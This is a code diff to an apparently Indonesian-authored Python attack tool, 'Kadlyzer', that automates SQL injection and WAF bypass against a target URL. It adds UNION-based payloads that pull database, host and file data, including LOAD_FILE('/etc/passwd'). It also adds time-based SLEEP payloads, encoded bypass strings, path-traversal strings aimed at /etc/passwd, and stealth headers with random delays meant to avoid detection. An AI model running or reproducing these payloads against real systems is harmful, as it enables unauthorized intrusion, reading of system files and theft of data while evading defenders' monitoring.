@@ -285,7 +285,7 @@ ADVANCED_WAF_BYPASS = {
                 "..%c0%af..%c0%af..%c0%afetc/passwd",
                 "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
                 "..%25c0%25af..%25c0%25af..%25c0%25afetc/passwd",
-                "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"
+                "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"
             ]
         },
         {
@@ -1602,12 +1602,214 @@ async def cleanup_resources():
         raise
 
 def generate_report(target_info, results):
-    """Generate report data structure"""
-    return {
+    """Generate report dalam format JSON dan TXT"""
+    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+    
+    # Prepare report data
+    report_data = {
+        'timestamp': timestamp,
         'target': target_info,
-        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
-        'results': results
+        'scan_results': results,
+        'vulnerabilities_detail': []
     }
+    
+    # Tambahkan detail untuk setiap vulnerability
+    if 'vulnerabilities' in results:
+        for vuln in results['vulnerabilities']:
+            detail = {
+                'type': vuln['type'],
+                'payload': vuln['payload'],
+                'url': vuln.get('url', ''),
+                'evidence': vuln.get('evidence', []),
+                'severity': vuln.get('severity', 'medium'),
+                'proof_of_concept': vuln.get('poc', ''),
+                'database_info': vuln.get('database_info', {}),
+                'extracted_data': vuln.get('extracted_data', [])
+            }
+            report_data['vulnerabilities_detail'].append(detail)
+    
+    # Generate JSON report
+    json_report = json.dumps(report_data, indent=4)
+    json_file = f"reports/kadlyzer_report_{timestamp}.json"
+    
+    # Generate TXT report
+    txt_content = f"""
+KADLYZER SECURITY SCAN REPORT
+============================
+Timestamp: {timestamp}
+Target: {target_info['full_url']}
+Domain: {target_info['domain']}
+
+SCAN RESULTS
+===========
+"""
+    
+    if 'waf_detected' in results:
+        txt_content += "\nWAF Detection:\n"
+        txt_content += "--------------\n"
+        for waf in results['waf_detected']:
+            txt_content += f"- {waf}\n"
+    
+    if 'parameters' in results:
+        txt_content += "\nDiscovered Parameters:\n"
+        txt_content += "--------------------\n"
+        for param in results['parameters']:
+            txt_content += f"- {param}\n"
+    
+    if 'vulnerabilities' in results:
+        txt_content += "\nVulnerabilities Found:\n"
+        txt_content += "--------------------\n"
+        for vuln in results['vulnerabilities']:
+            txt_content += f"\nType: {vuln['type']}\n"
+            txt_content += f"Severity: {vuln.get('severity', 'medium')}\n"
+            txt_content += f"URL: {vuln.get('url', '')}\n"
+            txt_content += f"Payload: {vuln['payload']}\n"
+            
+            if 'database_info' in vuln:
+                txt_content += "\nDatabase Information:\n"
+                for key, value in vuln['database_info'].items():
+                    txt_content += f"  {key}: {value}\n"
+            
+            if 'extracted_data' in vuln:
+                txt_content += "\nExtracted Data:\n"
+                for data in vuln['extracted_data']:
+                    txt_content += f"  - {data}\n"
+            
+            if 'evidence' in vuln:
+                txt_content += "\nEvidence:\n"
+                for evidence in vuln['evidence']:
+                    txt_content += f"  - {evidence}\n"
+            
+            if 'poc' in vuln:
+                txt_content += f"\nProof of Concept:\n{vuln['poc']}\n"
+            
+            txt_content += "-" * 50 + "\n"
+    
+    txt_file = f"reports/kadlyzer_report_{timestamp}.txt"
+    
+    # Save reports
+    os.makedirs("reports", exist_ok=True)
+    with open(json_file, 'w') as f:
+        f.write(json_report)
+    with open(txt_file, 'w') as f:
+        f.write(txt_content)
+    
+    return json_file, txt_file
+
+async def validate_sql_injection(response, payload):
+    """Validasi SQL injection dengan pembuktian yang lebih akurat"""
+    content = await response.text()
+    validation = {
+        'is_vulnerable': False,
+        'severity': 'low',
+        'database_info': {},
+        'extracted_data': [],
+        'evidence': []
+    }
+    
+    try:
+        # Test untuk database version dan nama
+        version_payloads = [
+            "' UNION SELECT NULL,VERSION(),NULL,NULL-- -",
+            "' UNION SELECT NULL,@@version,NULL,NULL-- -",
+            "' UNION SELECT NULL,sqlite_version(),NULL,NULL-- -",
+            "' UNION SELECT NULL,pg_version(),NULL,NULL-- -"
+        ]
+        
+        db_name_payloads = [
+            "' UNION SELECT NULL,DATABASE(),NULL,NULL-- -",
+            "' UNION SELECT NULL,db_name(),NULL,NULL-- -",
+            "' UNION SELECT NULL,current_database(),NULL,NULL-- -"
+        ]
+        
+        # Test untuk table information
+        table_payloads = [
+            "' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL,NULL FROM information_schema.tables-- -",
+            "' UNION SELECT NULL,STRING_AGG(tablename, ','),NULL,NULL FROM pg_catalog.pg_tables-- -"
+        ]
+        
+        # Check for database errors
+        error_patterns = [
+            (r"SQL syntax.*MySQL", "MySQL"),
+            (r"PostgreSQL.*ERROR", "PostgreSQL"),
+            (r"Microsoft SQL Server", "MSSQL"),
+            (r"ORA-[0-9][0-9][0-9][0-9]", "Oracle"),
+            (r"SQLite3::", "SQLite")
+        ]
+        
+        for pattern, db_type in error_patterns:
+            if re.search(pattern, content, re.I):
+                validation['is_vulnerable'] = True
+                validation['severity'] = 'high'
+                validation['database_info']['type'] = db_type
+                validation['evidence'].append(f"Database error pattern found: {pattern}")
+        
+        # Extract database version
+        version_pattern = r"[0-9]+\.[0-9]+\.[0-9]+[-]?[0-9]*"
+        version_match = re.search(version_pattern, content)
+        if version_match:
+            validation['database_info']['version'] = version_match.group(0)
+            validation['evidence'].append(f"Database version found: {version_match.group(0)}")
+        
+        # Extract table names
+        table_pattern = r"[a-zA-Z0-9_]+,[a-zA-Z0-9_]+"
+        table_match = re.search(table_pattern, content)
+        if table_match:
+            tables = table_match.group(0).split(',')
+            validation['extracted_data'].extend(tables)
+            validation['evidence'].append(f"Table names found: {', '.join(tables)}")
+        
+        # Generate proof of concept
+        if validation['is_vulnerable']:
+            validation['poc'] = f"""
+SQL Injection PoC:
+URL: {response.url}
+Payload: {payload}
+Response contains database information:
+- Type: {validation['database_info'].get('type', 'Unknown')}
+- Version: {validation['database_info'].get('version', 'Unknown')}
+Extracted tables: {', '.join(validation['extracted_data']) if validation['extracted_data'] else 'None'}
+"""
+    
+    except Exception as e:
+        logger.error(f"Error in SQL injection validation: {str(e)}")
+    
+    return validation
+
+async def test_payload(self, vuln_type, payload):
+    """Test payload dengan validasi yang lebih akurat"""
+    try:
+        # Prepare URL with payload
+        test_url = f"{self.target_info['full_url']}?test={urllib.parse.quote(payload)}"
+        
+        # Send request with payload
+        async with aiohttp.ClientSession() as session:
+            async with session.get(
+                test_url,
+                headers=random.choice(BYPASS_WAF_HEADERS),
+                timeout=10,
+                ssl=False
+            ) as response:
+                
+                if vuln_type == 'sql_injection':
+                    validation = await validate_sql_injection(response, payload)
+                    if validation['is_vulnerable']:
+                        return {
+                            'type': vuln_type,
+                            'payload': payload,
+                            'url': test_url,
+                            'severity': validation['severity'],
+                            'database_info': validation['database_info'],
+                            'extracted_data': validation['extracted_data'],
+                            'evidence': validation['evidence'],
+                            'poc': validation['poc']
+                        }
+                
+                # Add other vulnerability type validations here...
+                
+    except Exception as e:
+        logger.debug(f"Payload test failed: {str(e)}")
+    return None
 
 def generate_html_report(report_data):
     """Generate HTML report with modern styling"""
@@ -1984,6 +2186,284 @@ class AdvancedScanner(AdvancedBypassScanner):
             return True
             
         return False
+
+class AdvancedServerPenetration:
+    def __init__(self, target_info):
+        self.target_info = target_info
+        self.advanced_payloads = {
+            'sql_verification': [
+                "' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL,NULL-- -",
+                "' UNION SELECT NULL,@@datadir,NULL,NULL-- -",
+                "' UNION SELECT NULL,@@hostname,NULL,NULL-- -",
+                "' UNION SELECT NULL,USER(),NULL,NULL-- -",
+                "' UNION SELECT NULL,CURRENT_USER(),NULL,NULL-- -",
+                "' UNION SELECT NULL,UUID(),NULL,NULL-- -",
+                "') AND SLEEP(5) AND ('a'='a",
+                "') AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND ('a'='a",
+                "' AND (SELECT 2222 FROM (SELECT(SLEEP(5)))a)-- -",
+                "' AND (SELECT * FROM (SELECT SLEEP(5))a)-- -",
+                "') WAITFOR DELAY '0:0:5'--",
+            ],
+            'advanced_bypass': [
+                # Double URL Encoding
+                "%2527%2520OR%25201%253D1%2523",
+                "%2527%2520UNION%2520SELECT%2520NULL%252CDATABASE%2528%2529%252CNULL%252CNULL%2523",
+                
+                # Unicode Bypass
+                "¯_(ツ)_/¯'/*!50000UnIoN*//*!50000SeLeCt*/¯_(ツ)_/¯",
+                "ï¼‡ï¼ OR 1=1 ï¼‡ï¼",
+                
+                # Comment Injection
+                "'+/*!50000UnIoN*//*!50000SeLeCt*/+1,2,3--+",
+                "'+/*!12345UnIoN*//*!12345sElEcT*/+1,2,3--+",
+                
+                # Space Bypass
+                "'%0bOR%0b'1'%0b='1",
+                "'%0cUNION%0cSELECT%0cNULL,DATABASE()--",
+                
+                # Mixed Case + Comments
+                "UnI/**/on+SeL/**/eCT+1,2,3--",
+                "Un/**/IoN/**/AlL/**/SeLe/**/Ct/**/1,2,3--",
+                
+                # Advanced Concatenation
+                "'%2b'1'%2b'1",
+                "CONCAT/*!(0x28,0x29,0x7e)*/",
+            ],
+            'server_verification': [
+                # Server Info Extraction
+                "' UNION SELECT NULL,@@version_compile_os,NULL,NULL-- -",
+                "' UNION SELECT NULL,@@version_compile_machine,NULL,NULL-- -",
+                "' UNION SELECT NULL,@@port,NULL,NULL-- -",
+                
+                # File System Access
+                "' UNION SELECT NULL,@@plugin_dir,NULL,NULL-- -",
+                "' UNION SELECT NULL,@@log_error,NULL,NULL-- -",
+                "' UNION SELECT NULL,@@general_log_file,NULL,NULL-- -",
+                
+                # Server Variables
+                "' UNION SELECT NULL,@@max_connections,NULL,NULL-- -",
+                "' UNION SELECT NULL,@@have_symlink,NULL,NULL-- -",
+                "' UNION SELECT NULL,@@hostname,NULL,NULL-- -",
+            ]
+        }
+        
+    async def perform_deep_penetration(self):
+        """Melakukan penetration testing yang lebih dalam"""
+        results = {
+            'server_info': {},
+            'vulnerabilities': [],
+            'successful_bypasses': []
+        }
+        
+        try:
+            async with aiohttp.ClientSession() as session:
+                # 1. Server Information Gathering
+                server_info = await self.gather_server_info(session)
+                if server_info:
+                    results['server_info'] = server_info
+                
+                # 2. Advanced WAF Bypass
+                bypass_results = await self.attempt_advanced_bypass(session)
+                if bypass_results:
+                    results['successful_bypasses'] = bypass_results
+                
+                # 3. Deep Vulnerability Verification
+                vuln_results = await self.verify_vulnerabilities(session)
+                if vuln_results:
+                    results['vulnerabilities'] = vuln_results
+                
+            return results
+            
+        except Exception as e:
+            logger.error(f"Deep penetration error: {str(e)}")
+            return None
+
+    async def gather_server_info(self, session):
+        """Gather detailed server information"""
+        server_info = {}
+        
+        for payload in self.advanced_payloads['server_verification']:
+            try:
+                headers = self.generate_stealth_headers()
+                url = f"{self.target_info['full_url']}?id={urllib.parse.quote(payload)}"
+                
+                async with session.get(url, headers=headers) as response:
+                    content = await response.text()
+                    
+                    # Extract server information
+                    if '@@version_compile_os' in payload and response.status == 200:
+                        os_match = re.search(r"(Windows|Linux|Unix|FreeBSD|MacOS)", content)
+                        if os_match:
+                            server_info['operating_system'] = os_match.group(1)
+                    
+                    if '@@port' in payload and response.status == 200:
+                        port_match = re.search(r"\b\d{2,5}\b", content)
+                        if port_match:
+                            server_info['internal_port'] = port_match.group(0)
+                    
+                    if '@@hostname' in payload and response.status == 200:
+                        host_match = re.search(r"[\w\-\.]+", content)
+                        if host_match:
+                            server_info['internal_hostname'] = host_match.group(0)
+                            
+            except Exception as e:
+                logger.debug(f"Server info gathering error: {str(e)}")
+                continue
+                
+        return server_info
+
+    async def attempt_advanced_bypass(self, session):
+        """Attempt advanced WAF bypass techniques"""
+        successful_bypasses = []
+        
+        for payload in self.advanced_payloads['advanced_bypass']:
+            try:
+                # Rotate different techniques
+                headers = self.generate_stealth_headers()
+                encoded_payload = self.advanced_payload_encoding(payload)
+                
+                # Try different injection points
+                injection_points = [
+                    f"?id={encoded_payload}",
+                    f"?page={encoded_payload}",
+                    f"/{encoded_payload}",
+                    f"?search={encoded_payload}",
+                    f"?q={encoded_payload}"
+                ]
+                
+                for injection in injection_points:
+                    url = f"{self.target_info['full_url']}{injection}"
+                    
+                    # Add random delay to avoid detection
+                    await asyncio.sleep(random.uniform(0.5, 2))
+                    
+                    async with session.get(url, headers=headers) as response:
+                        content = await response.text()
+                        
+                        # Validate bypass success
+                        if await self.validate_bypass_success(response, content, payload):
+                            successful_bypasses.append({
+                                'payload': payload,
+                                'injection_point': injection,
+                                'headers': headers,
+                                'response_code': response.status
+                            })
+                            break  # Move to next payload if successful
+                            
+            except Exception as e:
+                logger.debug(f"Bypass attempt error: {str(e)}")
+                continue
+                
+        return successful_bypasses
+
+    def generate_stealth_headers(self):
+        """Generate stealth headers to avoid detection"""
+        headers = {
+            'User-Agent': random.choice([
+                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+                'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15'
+            ]),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'close',
+            'Upgrade-Insecure-Requests': '1',
+            'Cache-Control': 'no-cache',
+            'X-Requested-With': 'XMLHttpRequest'
+        }
+        
+        # Add random headers
+        random_headers = {
+            'X-Custom-' + ''.join(random.choices(string.ascii_letters, k=8)): ''.join(random.choices(string.ascii_letters + string.digits, k=12))
+            for _ in range(random.randint(1, 3))
+        }
+        
+        headers.update(random_headers)
+        return headers
+
+    def advanced_payload_encoding(self, payload):
+        """Encode payload using advanced techniques"""
+        encoding_techniques = [
+            lambda p: urllib.parse.quote(p),  # URL encode
+            lambda p: urllib.parse.quote(urllib.parse.quote(p)),  # Double URL encode
+            lambda p: ''.join(f'%{ord(c):02x}' for c in p),  # Hex encode
+            lambda p: base64.b64encode(p.encode()).decode(),  # Base64 encode
+            lambda p: p.replace(' ', '/**/'),  # Comment injection
+            lambda p: ''.join(f'&#x{ord(c):x};' for c in p),  # HTML hex encode
+        ]
+        
+        # Apply random combination of encodings
+        encoded = payload
+        for _ in range(random.randint(1, 3)):
+            encoder = random.choice(encoding_techniques)
+            encoded = encoder(encoded)
+            
+        return encoded
+
+    async def validate_bypass_success(self, response, content, payload):
+        """Validate if bypass was successful"""
+        # Check response status
+        if response.status == 200:
+            # Check for SQL errors or successful injection
+            sql_patterns = [
+                r"sql syntax",
+                r"mysql error",
+                r"mysql_fetch_array",
+                r"mysql_num_rows",
+                r"mysql_result",
+                r"postgresql error",
+                r"ora-\d{5}",
+                r"microsoft sql server",
+                r"microsoft ole db provider for sql server",
+                r"unclosed quotation mark",
+                r"unterminated string literal"
+            ]
+            
+            if any(re.search(pattern, content, re.I) for pattern in sql_patterns):
+                return True
+            
+            # Check for successful data extraction
+            if any(marker in content.lower() for marker in ['database()', 'version()', 'user()']):
+                return True
+                
+            # Check for time-based injection success
+            if 'SLEEP' in payload.upper() and response.elapsed.total_seconds() > 5:
+                return True
+                
+        return False
+
+    async def verify_vulnerabilities(self, session):
+        """Verify discovered vulnerabilities with deep testing"""
+        verified_vulns = []
+        
+        for payload in self.advanced_payloads['sql_verification']:
+            try:
+                headers = self.generate_stealth_headers()
+                url = f"{self.target_info['full_url']}?id={urllib.parse.quote(payload)}"
+                
+                async with session.get(url, headers=headers) as response:
+                    content = await response.text()
+                    
+                    # Validate SQL injection
+                    validation = await validate_sql_injection(response, payload)
+                    if validation['is_vulnerable']:
+                        verified_vulns.append({
+                            'type': 'sql_injection',
+                            'payload': payload,
+                            'url': url,
+                            'severity': validation['severity'],
+                            'database_info': validation['database_info'],
+                            'extracted_data': validation['extracted_data'],
+                            'evidence': validation['evidence'],
+                            'poc': validation['poc']
+                        })
+                        
+            except Exception as e:
+                logger.debug(f"Vulnerability verification error: {str(e)}")
+                continue
+                
+        return verified_vulns
 
 if __name__ == "__main__":
     try:
